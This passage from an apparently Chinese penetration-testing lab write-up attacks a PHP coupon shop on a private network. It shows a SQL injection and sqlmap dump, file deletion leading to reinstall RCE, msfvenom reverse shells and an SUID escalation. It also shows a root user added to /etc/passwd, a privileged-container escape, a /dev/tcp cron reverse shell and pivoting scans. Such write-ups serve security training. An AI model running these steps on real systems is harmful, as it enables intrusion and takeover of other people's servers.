class="line">nasa3333.</span><br><span class="line">NASA3333</span><br><span class="line">NASA3333.</span><br><span class="line">nasa33333</span><br><span class="line">nasa33333.</span><br><span class="line">NASA33333</span><br><span class="line">NASA33333.</span><br><span class="line">nasa333333</span><br><span class="line">nasa333333.</span><br><span class="line">NASA333333</span><br><span class="line">NASA333333.</span><br><span class="line">nasa3333333</span><br><span class="line">nasa3333333.</span><br><span class="line">NASA3333333</span><br><span class="line">NASA3333333.</span><br><span class="line">nasa33333333</span><br><span class="line">nasa33333333.</span><br><span class="line">NASA33333333</span><br><span class="line">NASA33333333.</span><br><span class="line">nasa44</span><br><span class="line">nasa44.</span><br><span class="line">NASA44</span><br><span class="line">NASA44.</span><br><span class="line">nasa444</span><br><span class="line">nasa444.</span><br><span class="line">NASA444</span><br><span class="line">NASA444.</span><br><span class="line">nasa4444</span><br><span class="line">nasa4444.</span><br><span class="line">NASA4444</span><br><span class="line">NASA4444.</span><br><span class="line">nasa44444</span><br><span class="line">nasa44444.</span><br><span class="line">NASA44444</span><br><span class="line">NASA44444.</span><br><span class="line">nasa444444</span><br><span class="line">nasa444444.</span><br><span class="line">NASA444444</span><br><span class="line">NASA444444.</span><br><span class="line">nasa4444444</span><br><span class="line">nasa4444444.</span><br><span class="line">NASA4444444</span><br><span class="line">NASA4444444.</span><br><span class="line">nasa44444444</span><br><span class="line">nasa44444444.</span><br><span class="line">NASA44444444</span><br><span class="line">NASA44444444.</span><br><span class="line">nasa55</span><br><span class="line">nasa55.</span><br><span class="line">NASA55</span><br><span class="line">NASA55.</span><br><span class="line">nasa555</span><br><span class="line">nasa555.</span><br><span class="line">NASA555</span><br><span class="line">NASA555.</span><br><span class="line">nasa5555</span><br><span class="line">nasa5555.</span><br><span class="line">NASA5555</span><br><span class="line">NASA5555.</span><br><span class="line">nasa55555</span><br><span class="line">nasa55555.</span><br><span class="line">NASA55555</span><br><span class="line">NASA55555.</span><br><span class="line">nasa555555</span><br><span class="line">nasa555555.</span><br><span class="line">NASA555555</span><br><span class="line">NASA555555.</span><br><span class="line">nasa5555555</span><br><span class="line">nasa5555555.</span><br><span class="line">NASA5555555</span><br><span class="line">NASA5555555.</span><br><span class="line">nasa55555555</span><br><span class="line">nasa55555555.</span><br><span class="line">NASA55555555</span><br><span class="line">NASA55555555.</span><br><span class="line">nasa66</span><br><span class="line">nasa66.</span><br><span class="line">NASA66</span><br><span class="line">NASA66.</span><br><span class="line">nasa666</span><br><span class="line">nasa666.</span><br><span class="line">NASA666</span><br><span class="line">NASA666.</span><br><span class="line">nasa6666</span><br><span class="line">nasa6666.</span><br><span class="line">NASA6666</span><br><span class="line">NASA6666.</span><br><span class="line">nasa66666</span><br><span class="line">nasa66666.</span><br><span class="line">NASA66666</span><br><span class="line">NASA66666.</span><br><span class="line">nasa666666</span><br><span class="line">nasa666666.</span><br><span class="line">NASA666666</span><br><span class="line">NASA666666.</span><br><span class="line">nasa6666666</span><br><span class="line">nasa6666666.</span><br><span class="line">NASA6666666</span><br><span class="line">NASA6666666.</span><br><span class="line">nasa66666666</span><br><span class="line">nasa66666666.</span><br><span class="line">NASA66666666</span><br><span class="line">NASA66666666.</span><br><span class="line">nasa77</span><br><span class="line">nasa77.</span><br><span class="line">NASA77</span><br><span class="line">NASA77.</span><br><span class="line">nasa777</span><br><span class="line">nasa777.</span><br><span class="line">NASA777</span><br><span class="line">NASA777.</span><br><span class="line">nasa7777</span><br><span class="line">nasa7777.</span><br><span class="line">NASA7777</span><br><span class="line">NASA7777.</span><br><span class="line">nasa77777</span><br><span class="line">nasa77777.</span><br><span class="line">NASA77777</span><br><span class="line">NASA77777.</span><br><span class="line">nasa777777</span><br><span class="line">nasa777777.</span><br><span class="line">NASA777777</span><br><span class="line">NASA777777.</span><br><span class="line">nasa7777777</span><br><span class="line">nasa7777777.</span><br><span class="line">NASA7777777</span><br><span class="line">NASA7777777.</span><br><span class="line">nasa77777777</span><br><span class="line">nasa77777777.</span><br><span class="line">NASA77777777</span><br><span class="line">NASA77777777.</span><br><span class="line">nasa88</span><br><span class="line">nasa88.</span><br><span class="line">NASA88</span><br><span class="line">NASA88.</span><br><span class="line">nasa888</span><br><span class="line">nasa888.</span><br><span class="line">NASA888</span><br><span class="line">NASA888.</span><br><span class="line">nasa8888</span><br><span class="line">nasa8888.</span><br><span class="line">NASA8888</span><br><span class="line">NASA8888.</span><br><span class="line">nasa88888</span><br><span class="line">nasa88888.</span><br><span class="line">NASA88888</span><br><span class="line">NASA88888.</span><br><span class="line">nasa888888</span><br><span class="line">nasa888888.</span><br><span class="line">NASA888888</span><br><span class="line">NASA888888.</span><br><span class="line">nasa8888888</span><br><span class="line">nasa8888888.</span><br><span class="line">NASA8888888</span><br><span class="line">NASA8888888.</span><br><span class="line">nasa88888888</span><br><span class="line">nasa88888888.</span><br><span class="line">NASA88888888</span><br><span class="line">NASA88888888.</span><br><span class="line">nasa99</span><br><span class="line">nasa99.</span><br><span class="line">NASA99</span><br><span class="line">NASA99.</span><br><span class="line">nasa999</span><br><span class="line">nasa999.</span><br><span class="line">NASA999</span><br><span class="line">NASA999.</span><br><span class="line">nasa9999</span><br><span class="line">nasa9999.</span><br><span class="line">NASA9999</span><br><span class="line">NASA9999.</span><br><span class="line">nasa99999</span><br><span class="line">nasa99999.</span><br><span class="line">NASA99999</span><br><span class="line">NASA99999.</span><br><span class="line">nasa999999</span><br><span class="line">nasa999999.</span><br><span class="line">NASA999999</span><br><span class="line">NASA999999.</span><br><span class="line">nasa9999999</span><br><span class="line">nasa9999999.</span><br><span class="line">NASA9999999</span><br><span class="line">NASA9999999.</span><br><span class="line">nasa99999999</span><br><span class="line">nasa99999999.</span><br><span class="line">NASA99999999</span><br><span class="line">NASA99999999.</span><br><span class="line">nasa00</span><br><span class="line">nasa00.</span><br><span class="line">NASA00</span><br><span class="line">NASA00.</span><br><span class="line">nasa000</span><br><span class="line">nasa000.</span><br><span class="line">NASA000</span><br><span class="line">NASA000.</span><br><span class="line">nasa0000</span><br><span class="line">nasa0000.</span><br><span class="line">NASA0000</span><br><span class="line">NASA0000.</span><br><span class="line">nasa00000</span><br><span class="line">nasa00000.</span><br><span class="line">NASA00000</span><br><span class="line">NASA00000.</span><br><span class="line">nasa000000</span><br><span class="line">nasa000000.</span><br><span class="line">NASA000000</span><br><span class="line">NASA000000.</span><br><span class="line">nasa0000000</span><br><span class="line">nasa0000000.</span><br><span class="line">NASA0000000</span><br><span class="line">NASA0000000.</span><br><span class="line">nasa00000000</span><br><span class="line">nasa00000000.</span><br><span class="line">NASA00000000</span><br><span class="line">NASA00000000.</span><br><span class="line">nasa1997</span><br><span class="line">nasa1997.</span><br><span class="line">NASA1997</span><br><span class="line">NASA1997.</span><br><span class="line">nasa1998</span><br><span class="line">nasa1998.</span><br><span class="line">NASA1998</span><br><span class="line">NASA1998.</span><br><span class="line">nasa1999</span><br><span class="line">nasa1999.</span><br><span class="line">NASA1999</span><br><span class="line">NASA1999.</span><br><span class="line">nasa2000</span><br><span class="line">nasa2000.</span><br><span class="line">NASA2000</span><br><span class="line">NASA2000.</span><br><span class="line">nasa2001</span><br><span class="line">nasa2001.</span><br><span class="line">NASA2001</span><br><span class="line">NASA2001.</span><br><span class="line">nasa2002</span><br><span class="line">nasa2002.</span><br><span class="line">NASA2002</span><br><span class="line">NASA2002.</span><br><span class="line">nasa2003</span><br><span class="line">nasa2003.</span><br><span class="line">NASA2003</span><br><span class="line">NASA2003.</span><br><span class="line">nasa2004</span><br><span class="line">nasa2004.</span><br><span class="line">NASA2004</span><br><span class="line">NASA2004.</span><br><span class="line">nasa2005</span><br><span class="line">nasa2005.</span><br><span class="line">NASA2005</span><br><span class="line">NASA2005.</span><br><span class="line">nasa2006</span><br><span class="line">nasa2006.</span><br><span class="line">NASA2006</span><br><span class="line">NASA2006.</span><br><span class="line">nasa2007</span><br><span class="line">nasa2007.</span><br><span class="line">NASA2007</span><br><span class="line">NASA2007.</span><br><span class="line">nasa2008</span><br><span class="line">nasa2008.</span><br><span class="line">NASA2008</span><br><span class="line">NASA2008.</span><br><span class="line">nasa2009</span><br><span class="line">nasa2009.</span><br><span class="line">NASA2009</span><br><span class="line">NASA2009.</span><br><span class="line">nasa2010</span><br><span class="line">nasa2010.</span><br><span class="line">NASA2010</span><br><span class="line">NASA2010.</span><br><span class="line">nasa2011</span><br><span class="line">nasa2011.</span><br><span class="line">NASA2011</span><br><span class="line">NASA2011.</span><br><span class="line">nasa2012</span><br><span class="line">nasa2012.</span><br><span class="line">NASA2012</span><br><span class="line">NASA2012.</span><br><span class="line">nasa2013</span><br><span class="line">nasa2013.</span><br><span class="line">NASA2013</span><br><span class="line">NASA2013.</span><br><span class="line">nasa2014</span><br><span class="line">nasa2014.</span><br><span class="line">NASA2014</span><br><span class="line">NASA2014.</span><br><span class="line">nasa2015</span><br><span class="line">nasa2015.</span><br><span class="line">NASA2015</span><br><span class="line">NASA2015.</span><br><span class="line">nasa2016</span><br><span class="line">nasa2016.</span><br><span class="line">NASA2016</span><br><span class="line">NASA2016.</span><br><span class="line">nasa2017</span><br><span class="line">nasa2017.</span><br><span class="line">NASA2017</span><br><span class="line">NASA2017.</span><br><span class="line">nasa2018</span><br><span class="line">nasa2018.</span><br><span class="line">NASA2018</span><br><span class="line">NASA2018.</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############社工密码字典在线生成##############</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Powered by 安全之家.www.xiaobaibk.cn</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/7.png" alt></p>
<p>得到后台账户密码 <code>admin / nasa123</code></p>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><ul>
<li>存在如下代码路径</li>
</ul>
<p><img data-src="./NASA/8.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'dohuishou'</span>:</span><br><span class="line"> </span><br><span class="line">$order_id = trim( $_REQUEST[<span class="string">'order_id'</span>] );</span><br><span class="line"></span><br><span class="line">$order = $db2-&gt;getRow(<span class="string">'select * from xy_order where order_id="'</span>.$order_id.<span class="string">'"'</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">empty</span>( $order ) )</span><br><span class="line">&#123;</span><br><span class="line">     json_error(<span class="string">'订单不存在'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $order[<span class="string">'order_pstate'</span>] == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    json_error(<span class="string">'订单未付款'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $order[<span class="string">'order_state'</span>] == <span class="string">'whuishou'</span> )</span><br><span class="line">&#123;</span><br><span class="line">    json_error(<span class="string">'回收中，请勿重复操作'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $order[<span class="string">'order_state'</span>] == <span class="string">'endhuishou'</span> )</span><br><span class="line">&#123;</span><br><span class="line">    json_error(<span class="string">'回收成功，请勿重复操作'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$money = max( $order[<span class="string">'order_product_money'</span>], $order[<span class="string">'order_money'</span>] );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$order_goods = $db2-&gt;getAll( <span class="string">'select * from xy_orderdata where order_id="'</span>.$order_id.<span class="string">'"'</span> );</span><br><span class="line">$back_money_all = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span>($order_goods <span class="keyword">as</span> $kg =&gt; $ov   )</span><br><span class="line">&#123;</span><br><span class="line">    $goods = $db2-&gt;getRow( <span class="string">'select * from xy_product where product_id='</span>.$ov[<span class="string">'product_id'</span>] );</span><br><span class="line"></span><br><span class="line">    $hsmoney = $goods[<span class="string">'product_bmoney'</span>];</span><br><span class="line">    <span class="keyword">if</span>( $hsmoney &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $xy_set[<span class="string">'reback_percent'</span>] = $xy_set[<span class="string">'reback_percent'</span>] ? $xy_set[<span class="string">'reback_percent'</span>] : <span class="number">100</span> ;</span><br><span class="line">        $hsmoney = $ov[<span class="string">'product_smoney'</span>] *  $xy_set[<span class="string">'reback_percent'</span>] / <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       $back_money_all += $hsmoney;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#$xy_set['reback_percent'] = $xy_set['reback_percent'] ? $xy_set['reback_percent'] : 100 ;</span></span><br><span class="line">   <span class="comment">#$huishou_money = ( $xy_set['reback_percent'] / 100 ) * $money;</span></span><br><span class="line">   </span><br><span class="line">   $huishou_money = $back_money_all;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   $db2-&gt;query(<span class="string">'update xy_order set order_state = "whuishou" ,huishou_money="'</span>.$huishou_money.<span class="string">'" where order_id="'</span>.$order_id.<span class="string">'" '</span>);</span><br><span class="line">   json_ok(<span class="string">'操作成功，等待审核'</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>利用 <code>User-Agent Switcher</code>插件模拟手机用户</li>
<li>注册账号<code>laotie233 / laotie233  laotie233@qq.com</code></li>
</ul>
<p><img data-src="./NASA/9.png" alt></p>
<ul>
<li>注入包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /user.php?mod=back&amp;act=dohuishou&amp;order_id=1 HTTP/1.1</span><br><span class="line">Host: 192.168.59.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Linux; Android 11; Z832 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.59.128/user.php</span><br><span class="line">Cookie: PHPSESSID=98l83flj0d36v53cqcvf91vbl6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<ul>
<li>sqlmap跑数据</li>
</ul>
<p><img data-src="./NASA/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbms mysql --dbs --dump -T xy_admin -D yhj</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[23:25:46] [INFO] cracked password 'nasa123' for hash '5c771656e96f876293411b10dc90dc4d'                                                                                                                      </span><br><span class="line">Database: yhj                                                                                                                                                                                                 </span><br><span class="line">Table: xy_admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+---------------+--------------------------------------------+------------+-------------+-------------+</span><br><span class="line">| admin_id | adminlevel_id | admin_pw                                   | admin_name | admin_atime | admin_ltime |</span><br><span class="line">+----------+---------------+--------------------------------------------+------------+-------------+-------------+</span><br><span class="line">| 1        | 1             | 5c771656e96f876293411b10dc90dc4d (nasa123) | admin      | 1269059337  | 1650181191  |</span><br><span class="line">+----------+---------------+--------------------------------------------+------------+-------------+-------------+</span><br><span class="line"></span><br><span class="line">[23:25:49] [INFO] table 'yhj.xy_admin' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.59.128/dump/yhj/xy_admin.csv'</span><br><span class="line">[23:25:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.59.128'</span><br><span class="line">[23:25:49] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 23:25:49 /2022-04-29/</span><br></pre></td></tr></table></figure>

<ul>
<li>同理拿到密码<code>nasa123</code></li>
</ul>
<h4 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h4><ul>
<li>存在代码路径</li>
</ul>
<p><img data-src="./NASA/11.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//####################// 数据删除 //####################//</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">'del'</span>:</span><br><span class="line">	<span class="comment">//pe_error('演示站未开启删除权限');</span></span><br><span class="line">	pe_token_match();</span><br><span class="line">	pe_dirdel(<span class="string">"&#123;$pe['path_root']&#125;data/dbbackup/&#123;$_g_dbname&#125;"</span>);</span><br><span class="line">	pe_success(<span class="string">'删除完成！'</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除文件夹pe_dirdel函数逻辑，如果非文件夹，则删除，文件夹递归删除</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pe_dirdel</span><span class="params">($dir_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_file($dir_path)) &#123;</span><br><span class="line">		unlink($dir_path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$dir_arr = glob(trim($dir_path).<span class="string">'/*'</span>);</span><br><span class="line">		<span class="keyword">if</span> (is_array($dir_arr)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span> ($dir_arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">				pe_dirdel($v, $type);</span><br><span class="line">			&#125;	</span><br><span class="line">		&#125;</span><br><span class="line">		@rmdir($dir_path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="配合重装rce"><a href="#配合重装rce" class="headerlink" title="配合重装rce"></a>配合重装rce</h4><p><img data-src="./NASA/12.png" alt></p>
<ul>
<li>写入<code>config</code>逻辑</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($result) &#123;</span><br><span class="line">				$db-&gt;query(&quot;update &#96;&#123;$_p_dbpre&#125;admin&#96; set &#96;admin_name&#96; &#x3D; &#39;&#123;$_p_admin_name&#125;&#39;, &#96;admin_pw&#96; &#x3D; &#39;&quot;.md5($_p_admin_pw).&quot;&#39; where &#96;admin_id&#96;&#x3D;1&quot;, $dbconn);</span><br><span class="line">				$config &#x3D; &quot;&lt;?php\n\$pe[&#39;db_host&#39;] &#x3D; &#39;&#123;$_p_db_host&#125;&#39;; &#x2F;&#x2F;数据库主机地址\n\$pe[&#39;db_name&#39;] &#x3D; &#39;&#123;$_p_db_name&#125;&#39;; &#x2F;&#x2F;数据库名称\n\$pe[&#39;db_user&#39;] &#x3D; &#39;&#123;$_p_db_user&#125;&#39;; &#x2F;&#x2F;数据库用户名\n\$pe[&#39;db_pw&#39;] &#x3D; &#39;&#123;$_p_db_pw&#125;&#39;; &#x2F;&#x2F;数据库密码\n\$pe[&#39;db_coding&#39;] &#x3D; &#39;utf8&#39;;\n\$pe[&#39;url_model&#39;] &#x3D; &#39;pathinfo_safe&#39;; &#x2F;&#x2F;url模式,可选项(pathinfo&#x2F;pathinfo_safe&#x2F;php)\ndefine(&#39;dbpre&#39;,&#39;&#123;$_p_dbpre&#125;&#39;); &#x2F;&#x2F;数据库表前缀\n?&gt;&quot;;</span><br><span class="line">				file_put_contents(&quot;&#123;$pe[&#39;path_root&#39;]&#125;config.php&quot;, $config);</span><br><span class="line">				pe_goto(&quot;&#123;$pe[&#39;host_root&#39;]&#125;install&#x2F;index.php?step&#x3D;success&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>利用链路删除<code>lock</code>文件，重装写入<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /admin/webadmin.php?mod=db&amp;act=del&amp;dbname=../../install/install.lock&amp;token=b0b09d39e9af67fa311ab5dff1842340</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/13.png" alt></p>
<ul>
<li>开始安装</li>
</ul>
<p><img data-src="./NASA/14.png" alt></p>
<p><img data-src="./NASA/15.png" alt></p>
<ul>
<li>拿到<code>webshell</code></li>
</ul>
<p><img data-src="./NASA/16.png" alt></p>
<ul>
<li>提权</li>
</ul>
<p>当前权限为<code>www-data</code></p>
<p><img data-src="./NASA/17.png" alt></p>
<p>首先生成<code>msf</code>马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.59.138 LPORT=6556 -f raw &gt; laotieshell.php</span><br><span class="line"></span><br><span class="line">=============</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.59.138</span><br><span class="line">set LPORT 6556</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/18.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set session 1</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/19.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<ul>
<li><code>find</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line"></span><br><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/20.png" alt></p>
<h4 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h4><ul>
<li>发现当前处在容器中</li>
</ul>
<p><img data-src="./NASA/21.png" alt></p>
<ul>
<li>创建特权用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt laotiesec 123456 </span><br><span class="line">echo 'laotiesec:$1$laotiese$k8lfnWyyB/rgHq1fbUj4a1:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>容器为<code>--privileged=true</code>启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">创建目录 </span><br><span class="line">mkdir /test </span><br><span class="line"></span><br><span class="line">将宿主的目录挂载到test目录 </span><br><span class="line">mount /dev/sda1 /test </span><br><span class="line"></span><br><span class="line">改变根目录为 /test </span><br><span class="line">chroot /test</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/22.png" alt></p>
<ul>
<li>写shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo '/bin/bash -i &gt;&amp; bash -i &gt;&amp;/dev/tcp/192.168.59.138/23333 0&gt;&amp;1' &gt; /tmp/seclaotie.sh </span><br><span class="line">chmod +x /tmp/seclaotie.sh </span><br><span class="line">cat /tmp/seclaotie.sh </span><br><span class="line">echo '*/1 * * * * root bash /tmp/seclaotie.sh' &gt;&gt;/etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> kali</span></span><br><span class="line">nc -lvnp 23333</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到最终的<code>flag</code></li>
</ul>
<p><img data-src="./NASA/23.png" alt></p>
<h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><ul>
<li>在正式之前，先对ubuntu进行msf的shell反弹</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.59.138 LPORT=7777 -f elf &gt; laotieshell.elf</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.59.138</span><br><span class="line">set LPORT 7777</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">wget http://192.168.59.128/laotieshell.elf</span><br><span class="line"></span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/24.png" alt></p>
<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>添加路由</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run get_local_subnets </span><br><span class="line">run autoroute -s 192.168.59.0/255.255.255.0 </span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/25.png" alt></p>
<ul>
<li>启用代理，使用VERSION 5</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<ul>
<li>配置proxychains</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<ul>
<li>扫描内网nmap &amp;&amp; fscan(<a href="https://github.com/shadow1ng/fscan/releases" target="_blank" rel="noopener">Releases · shadow1ng/fscan · GitHub</a>)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo proxychains4 nmap -sT -Pn 192.168.59.0/24 -p 445,80</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Nmap scan report for 192.168.59.144</span><br><span class="line">Host is up (0.0053s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.59.197</span><br><span class="line">Host is up (0.0028s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">80/tcp  closed http</span><br><span class="line">445/tcp open   microsoft-ds</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 192.168.59.0/24 -np -no -nopoc</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">start infoscan</span><br><span class="line">192.168.59.138:22 open</span><br><span class="line">192.168.59.128:80 open</span><br><span class="line">192.168.59.144:80 open</span><br><span class="line">192.168.59.144:135 open</span><br><span class="line">192.168.59.197:135 open</span><br><span class="line">192.168.59.144:139 open</span><br><span class="line">192.168.59.197:139 open</span><br><span class="line">192.168.59.1:443 open</span><br><span class="line">192.168.59.144:445 open</span><br><span class="line">192.168.59.197:445 open</span><br><span class="line">192.168.59.138:1080 open</span><br><span class="line">192.168.59.138:7777 open</span><br><span class="line">[*] alive ports len is: 12</span><br><span class="line">start vulscan</span><br><span class="line">[+] 192.168.59.144      MS17-010        (Windows Server 2003 3790 Service Pack 2)</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]192.168.59.197</span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]win7</span></span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]10.10.10.142</span></span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]192.168.59.197</span></span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]192.168.59.144</span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]win2003</span></span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]10.10.10.137</span></span><br><span class="line"><span class="meta">   [-&gt;</span><span class="bash">]192.168.59.144</span></span><br><span class="line">[*] 192.168.59.144       __MSBROWSE__\WIN2003           Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[*] WebTitle:https://192.168.59.1      code:403 len:0      title:None</span><br><span class="line">[*] 192.168.59.197       __MSBROWSE__\WIN7              Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[+] 192.168.59.197      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle:http://192.168.59.128     code:200 len:62862  title:优惠券商城</span><br><span class="line">[*] WebTitle:http://192.168.59.144     code:200 len:1193   title:None</span><br><span class="line">[+] SSH:192.168.59.138:22:root root</span><br><span class="line">已完成 12/12</span><br><span class="line">[*] 扫描结束,耗时: 2m53.601073375s</span><br></pre></td></tr></table></figure>

<ul>
<li>共发现两台机器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.59.144</span><br><span class="line">192.168.59.197</span><br></pre></td></tr></table></figure>

<ul>
<li>永生之蓝 failed</li>
</ul>
